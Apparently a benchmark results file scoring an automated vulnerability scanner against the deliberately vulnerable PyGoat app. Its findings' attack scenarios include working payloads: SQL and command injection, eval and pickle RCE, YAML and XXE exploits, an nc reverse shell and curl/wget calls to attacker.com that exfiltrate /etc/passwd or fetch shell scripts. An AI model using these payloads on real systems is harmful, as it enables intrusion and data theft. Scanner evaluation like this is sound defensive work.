@@ -1,0 +1,291 @@
+{
+  "ts": "2026-07-12T10:43:37",
+  "run_label": "new_2",
+  "attempts": 1,
+  "recall": 0.6364,
+  "tp": 7,
+  "fp": 14,
+  "total_findings": 21,
+  "matched_ids": [
+    "pygoat-code-injection-eval",
+    "pygoat-command-injection",
+    "pygoat-imagemath-eval",
+    "pygoat-insecure-deser-pickle",
+    "pygoat-sqli-login",
+    "pygoat-unsafe-yaml",
+    "pygoat-xxe"
+  ],
+  "missed_ids": [
+    "pygoat-sqli-injection-lab",
+    "pygoat-ssrf",
+    "pygoat-ssti",
+    "pygoat-weak-hash"
+  ],
+  "usage": {
+    "haiku_in": 0,
+    "haiku_out": 0,
+    "sonnet_in": 72010,
+    "sonnet_out": 8192,
+    "calls": 1
+  },
+  "cost_usd": 0.3389,
+  "scan_time_s": 149.2,
+  "findings": [
+    {
+      "severity": "CRITICAL",
+      "title": "SQL Injection via Raw Query Construction",
+      "category": "SQLi",
+      "locations": [
+        {
+          "file": "views.py",
+          "line": 155
+        }
+      ],
+      "raw": "## [SEVERITY: CRITICAL] SQL Injection via Raw Query Construction\n\n**Category:** SQLi\n\n**Location:** `views.py:155`\n\n**Attack Scenario:**\n1. Attacker submits `name=' OR '1'='1' --` and any password\n2. The constructed query becomes: `SELECT * FROM introduction_login WHERE user='' OR '1'='1' --' AND password='...'`\n3. The `--` comments out the password check, and `'1'='1'` is always true\n4. Attacker bypasses authentication and can access any user's account\n5. The code then executes `login.objects.r"
+    },
+    {
+      "severity": "CRITICAL",
+      "title": "SQL Injection in injection_sql_lab",
+      "category": "SQLi",
+      "locations": [
+        {
+          "file": "views.py",
+          "line": 841
+        }
+      ],
+      "raw": "## [SEVERITY: CRITICAL] SQL Injection in injection_sql_lab\n\n**Category:** SQLi\n\n**Location:** `views.py:841`\n\n**Attack Scenario:**\n1. Attacker navigates to `/injection_sql_lab` endpoint\n2. Submits `name=' OR 1=1 UNION SELECT id, password FROM introduction_sql_lab_table --`\n3. The query becomes: `SELECT * FROM introduction_sql_lab_table WHERE id='' OR 1=1 UNION SELECT id, password FROM introduction_sql_lab_table --'AND password='...'`\n4. Attacker dumps all user IDs and password hashes\n5. Can extr"
+    },
+    {
+      "severity": "CRITICAL",
+      "title": "Command Injection via Shell Execution",
+      "category": "Injection",
+      "locations": [
+        {
+          "file": "views.py",
+          "line": 424
+        }
+      ],
+      "raw": "## [SEVERITY: CRITICAL] Command Injection via Shell Execution\n\n**Category:** Injection\n\n**Location:** `views.py:424`\n\n**Attack Scenario:**\n1. Attacker submits domain: `google.com; cat /etc/passwd`\n2. The regex only removes protocol prefixes, not shell metacharacters\n3. Command becomes: `dig google.com; cat /etc/passwd`\n4. Both commands execute: dig runs first, then `/etc/passwd` is dumped to attacker\n5. Attacker can execute arbitrary commands: `google.com; rm -rf /` or `google.com && curl attack"
+    },
+    {
+      "severity": "CRITICAL",
+      "title": "Arbitrary Code Execution via eval()",
+      "category": "Injection",
+      "locations": [
+        {
+          "file": "views.py",
+          "line": 454
+        }
+      ],
+      "raw": "## [SEVERITY: CRITICAL] Arbitrary Code Execution via eval()\n\n**Category:** Injection\n\n**Location:** `views.py:454`\n\n**Attack Scenario:**\n1. Attacker submits `val=__import__('os').system('rm -rf /')`\n2. The `eval()` function executes this as Python code\n3. Server's filesystem is destroyed, or attacker can:\n   - Read any file: `open('/etc/passwd').read()`\n   - Execute commands: `__import__('subprocess').check_output('whoami', shell=True)`\n   - Import modules and bypass all security controls\n   - A"
+    },
+    {
+      "severity": "CRITICAL",
+      "title": "Arbitrary Code Execution via eval() in mitre_lab_25_api",
+      "category": "Injection",
+      "locations": [
+        {
+          "file": "mitre.py",
+          "line": 216
+        }
+      ],
+      "raw": "## [SEVERITY: CRITICAL] Arbitrary Code Execution via eval() in mitre_lab_25_api\n\n**Category:** Injection\n\n**Location:** `mitre.py:216`\n\n**Attack Scenario:**\n1. Attacker sends POST to `/mitre/25/lab/api` with `expression=__import__('os').system('wget attacker.com/backdoor.sh -O /tmp/bd.sh && bash /tmp/bd.sh')`\n2. The `eval(expression)` executes the code immediately\n3. Backdoor is downloaded and executed\n4. Attacker gains persistent shell access with web server privileges\n\n**Blast Radius:**\nThis i"
+    },
+    {
+      "severity": "CRITICAL",
+      "title": "Command Injection in mitre_lab_17_api",
+      "category": "Injection",
+      "locations": [
+        {
+          "file": "mitre.py",
+          "line": 242
+        }
+      ],
+      "raw": "## [SEVERITY: CRITICAL] Command Injection in mitre_lab_17_api\n\n**Category:** Injection\n\n**Location:** `mitre.py:242`\n\n**Attack Scenario:**\n1. Attacker sends POST to `/mitre/17/lab/api` with `ip=127.0.0.1; curl http://attacker.com/$(cat /etc/passwd | base64)`\n2. Command becomes: `nmap 127.0.0.1; curl http://attacker.com/$(cat /etc/passwd | base64)`\n3. nmap runs first, then `/etc/passwd` is exfiltrated to attacker's server\n4. Attacker can chain commands to establish reverse shell or modify system "
+    },
+    {
+      "severity": "CRITICAL",
+      "title": "Arbitrary Code Execution via PyYAML unsafe load",
+      "category": "Injection",
+      "locations": [
+        {
+          "file": "views.py",
+          "line": 565
+        }
+      ],
+      "raw": "## [SEVERITY: CRITICAL] Arbitrary Code Execution via PyYAML unsafe load\n\n**Category:** Injection\n\n**Location:** `views.py:565`\n\n**Attack Scenario:**\n1. Attacker uploads YAML file containing:\n   ```yaml\n   !!python/object/apply:os.system [\"curl http://attacker.com/shell.sh | bash\"]\n   ```\n2. `yaml.load(file, yaml.Loader)` deserializes and executes the Python code\n3. Shell script downloads and executes, giving attacker reverse shell\n4. Attacker can escalate to full server control\n\n**Blast Radius:*"
+    },
+    {
+      "severity": "CRITICAL",
+      "title": "Arbitrary Code Execution via ImageMath.eval",
+      "category": "Injection",
+      "locations": [
+        {
+          "file": "views.py",
+          "line": 587
+        }
+      ],
+      "raw": "## [SEVERITY: CRITICAL] Arbitrary Code Execution via ImageMath.eval\n\n**Category:** Injection\n\n**Location:** `views.py:587`\n\n**Attack Scenario:**\n1. Attacker uploads image and sets `function=__import__('os').system('nc -e /bin/bash attacker.com 4444')`\n2. `ImageMath.eval(function_str, ...)` executes the Python code\n3. Reverse shell connects to attacker's machine\n4. Attacker gains interactive shell access with web server privileges\n\n**Blast Radius:**\nThe `a9_lab2` function at line 574 executes arb"
+    },
+    {
+      "severity": "CRITICAL",
+      "title": "XXE (XML External Entity) Injection",
+      "category": "Injection",
+      "locations": [
+        {
+          "file": "views.py",
+          "line": 253
+        }
+      ],
+      "raw": "## [SEVERITY: CRITICAL] XXE (XML External Entity) Injection\n\n**Category:** Injection\n\n**Location:** `views.py:253`\n\n**Attack Scenario:**\n1. Attacker sends POST to `/xxe_parse` with XML:\n   ```xml\n   <?xml version=\"1.0\"?>\n   <!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n   <comm><text>&xxe;</text></comm>\n   ```\n2. Parser loads external entity due to `parser.setFeature(feature_external_ges, True)`\n3. Contents of `/etc/passwd` are stored in database and displayed to attacker\n4. Attacke"
+    },
+    {
+      "severity": "CRITICAL",
+      "title": "Insecure Deserialization via pickle",
+      "category": "Injection",
+      "locations": [
+        {
+          "file": "views.py",
+          "line": 210
+        }
+      ],
+      "raw": "## [SEVERITY: CRITICAL] Insecure Deserialization via pickle\n\n**Category:** Injection\n\n**Location:** `views.py:210`\n\n**Attack Scenario:**\n1. Attacker crafts malicious pickle payload:\n   ```python\n   import pickle, base64, os\n   class Exploit:\n       def __reduce__(self):\n           return (os.system, ('curl http://attacker.com/pwn.sh | bash',))\n   payload = base64.b64encode(pickle.dumps(Exploit()))\n   ```\n2. Sets cookie `token=<payload>`\n3. On next request, `pickle.loads(token)` deserializes the "
+    },
+    {
+      "severity": "CRITICAL",
+      "title": "Server-Side Template Injection (SSTI)",
+      "category": "Injection",
+      "locations": [
+        {
+          "file": "views.py",
+          "line": 942
+        }
+      ],
+      "raw": "## [SEVERITY: CRITICAL] Server-Side Template Injection (SSTI)\n\n**Category:** Injection\n\n**Location:** `views.py:942`\n\n**Attack Scenario:**\n1. Attacker creates blog with content: `{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}`\n2. Template is saved to filesystem at line 950\n3. When blog is rendered via `ssti_view_blog`, Django evaluates the template\n4. The expression executes: `os.popen('id')` runs and output is displayed\n5. Attacker escalates to full RCE: "
+    },
+    {
+      "severity": "CRITICAL",
+      "title": "Path Traversal in SSRF Lab",
+      "category": "Path Traversal",
+      "locations": [
+        {
+          "file": "views.py",
+          "line": 897
+        }
+      ],
+      "raw": "## [SEVERITY: CRITICAL] Path Traversal in SSRF Lab\n\n**Category:** Path Traversal\n\n**Location:** `views.py:897`\n\n**Attack Scenario:**\n1. Attacker submits `blog=../../../../etc/passwd`\n2. `os.path.join(dirname, file)` constructs path\n3. Python's path resolution resolves to `/etc/passwd`\n4. File contents are read and displayed to attacker\n5. Attacker can read any file: `/etc/shadow`, database files, application secrets\n\n**Blast Radius:**\nThe `ssrf_lab` function at line 890 constructs file paths fro"
+    },
+    {
+      "severity": "CRITICAL",
+      "title": "Path Traversal in playground/ssrf/main.py",
+      "category": "Path Traversal",
+      "locations": [
+        {
+          "file": "playground/ssrf/main.py",
+          "line": 7
+        }
+      ],
+      "raw": "## [SEVERITY: CRITICAL] Path Traversal in playground/ssrf/main.py\n\n**Category:** Path Traversal\n\n**Location:** `playground/ssrf/main.py:7`\n\n**Attack Scenario:**\n1. Function `ssrf_lab` is called with `file='../../../../etc/passwd'`\n2. `os.path.join(dirname, file)` creates path that resolves to `/etc/passwd`\n3. File is opened and contents returned\n4. Since this function is called from `ssrf_code_checker` in apis.py (line 37), attacker can exploit via API\n\n**Blast Radius:**\nThis is a foundational p"
+    },
+    {
+      "severity": "HIGH",
+      "title": "Weak Cryptography - MD5 Password Hashing",
+      "category": "Secrets Exposure",
+      "locations": [
+        {
+          "file": "views.py",
+          "line": 969
+        }
+      ],
+      "raw": "## [SEVERITY: HIGH] Weak Cryptography - MD5 Password Hashing\n\n**Category:** Secrets Exposure\n\n**Location:** `views.py:969`\n\n**Attack Scenario:**\n1. Database with MD5 password hashes is compromised (via SQLi or other vulnerability)\n2. Attacker dumps hashes: `9d6edee6ce9312981084bd98eb3751ee` (alex), `c93ccd78b2076528346216b3b2f701e6` (admin)\n3. Attacker uses rainbow tables or hashcat to crack MD5 hashes in seconds\n4. MD5('password123') matches admin hash\n5. Attacker logs in as admin with cracked "
+    },
+    {
+      "severity": "HIGH",
+      "title": "Weak Cryptography - Custom Hash Function",
+      "category": "Secrets Exposure",
+      "locations": [
+        {
+          "file": "utility.py",
+          "line": 58
+        },
+        {
+          "file": "views.py",
+          "line": 985
+        }
+      ],
+      "raw": "## [SEVERITY: HIGH] Weak Cryptography - Custom Hash Function\n\n**Category:** Secrets Exposure\n\n**Location:** `utility.py:58`\n\n**Attack Scenario:**\n1. Function `customHash` just reverses SHA256: `hashlib.sha256(password.encode()).hexdigest()[::-1]`\n2. This provides zero additional security over plain SHA256\n3. Attacker dumps database, reverses the hash strings\n4. Now has standard SHA256 hashes which can be cracked with GPU\n5. Cracks admin password and gains full system access\n\n**Blast Radius:**\nTh"
+    },
+    {
+      "severity": "HIGH",
+      "title": "Auth Bypass - Missing Session Expiry Validation",
+      "category": "Auth Bypass",
+      "locations": [
+        {
+          "file": "mitre.py",
+          "line": 180
+        }
+      ],
+      "raw": "## [SEVERITY: HIGH] Auth Bypass - Missing Session Expiry Validation\n\n**Category:** Auth Bypass\n\n**Location:** `mitre.py:180`\n\n**Attack Scenario:**\n1. Attacker obtains expired JWT token from CSRF lab: `eyJ...` (expired 5 minutes ago)\n2. Sends request to `/mitre/9/lab/transaction` with expired token in `auth_cookiee` cookie\n3. `jwt.decode(cookie, 'csrf_vulneribility', algorithms=['HS256'])` decodes token\n4. Code checks if `User = CSRF_user_tbl.objects.filter(username=username)` exists\n5. No valida"
+    },
+    {
+      "severity": "HIGH",
+      "title": "Auth Bypass - Missing Expiry Check in sec_misconfig_lab3",
+      "category": "Auth Bypass",
+      "locations": [
+        {
+          "file": "views.py",
+          "line": 1008
+        }
+      ],
+      "raw": "## [SEVERITY: HIGH] Auth Bypass - Missing Expiry Check in sec_misconfig_lab3\n\n**Category:** Auth Bypass\n\n**Location:** `views.py:1008`\n\n**Attack Scenario:**\n1. Attacker creates account and gets JWT with `exp` field set to 60 minutes from now\n2. Waits 61 minutes for token to expire\n3. Sends request with expired token in `auth_cookie`\n4. `jwt.decode(cookie, SECRET_COOKIE_KEY, algorithms=['HS256'])` decodes without verifying expiry\n5. If payload contains `'user': 'admin'`, attacker gains admin acce"
+    },
+    {
+      "severity": "HIGH",
+      "title": "Auth Bypass - Missing Session Validation in auth_failure_lab3",
+      "category": "Auth Bypass",
+      "locations": [
+        {
+          "file": "views.py",
+          "line": 1090
+        }
+      ],
+      "raw": "## [SEVERITY: HIGH] Auth Bypass - Missing Session Validation in auth_failure_lab3\n\n**Category:** Auth Bypass\n\n**Location:** `views.py:1090`\n\n**Attack Scenario:**\n1. Attacker User1 logs in, gets session_id cookie: `a1b2c3d4`\n2. Database stores: `AF_session_id(session_id='a1b2c3d4', user='User1')`\n3. Attacker directly queries database or guesses session IDs\n4. Creates cookie with User2's valid session_id\n5. Code at line 1092 only checks `if session:` exists, not if it belongs to request.user\n6. At"
+    },
+    {
+      "severity": "HIGH",
+      "title": "CSRF Protection Disabled on State-Changing Operations",
+      "category": "CSRF",
+      "locations": [
+        {
+          "file": "mitre.py",
+          "line": 176
+        }
+      ],
+      "raw": "## [SEVERITY: HIGH] CSRF Protection Disabled on State-Changing Operations\n\n**Category:** CSRF\n\n**Location:** `mitre.py:176`\n\n**Attack Scenario:**\n1. Victim logs into CSRF lab at `/mitre/9/lab/login`\n2. Receives JWT in `auth_cookiee` cookie\n3. Attacker sends victim link to malicious page:\n   ```html\n   <img src=\"http://victim-app.com/mitre/9/lab/api/attacker/1000\">\n   ```\n4. Victim's browser sends GET request with victim's `auth_cookiee` cookie\n5. Function `csrf_transfer_monei_api` at line 190 ac"
+    },
+    {
+      "severity": "HIGH",
+      "title": "Stored XSS in xss_lab",
+      "category": "XSS",
+      "locations": [
+        {
+          "file": "views.py",
+          "line": 100
+        }
+      ],
+      "raw": "## [SEVERITY: HIGH] Stored XSS in xss_lab\n\n**Category:** XSS\n\n**Location:** `views.py:100`\n\n**Attack Scenario:**\n1. Attacker enters company name: `<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>`\n2. Stores malicious payload in `FAANG` table via separate interface\n3. Victim searches for this company\n4. Template renders at line 99: `args={\"company\":f[0].company, ...}`\n5. Django auto-escaping is bypassed if template uses `{{ company|safe }}`\n6. Script executes in victim'"
+    },
+    {
+      "severity": "HIGH",
+      "title": "Unrestricted File Write Enables Code Execution",
+      "category": "Path Traversal",
+      "locations": [
+        {
+          "file": "apis.py",
+          "line": 69
+        }
+      ],
+      "raw": "## [SEVERITY: HIGH] Unrestricted File Write Enables Code Execution\n\n**Category:** Path Traversal\n\n**Location:** `apis.py:69`\n\n**Attack Scenario:**\n1. Attacker sends POST to `/2021/discussion/A9/api` with:\n   - `log_code=import os; os.system('curl"
+    }
+  ]
+}
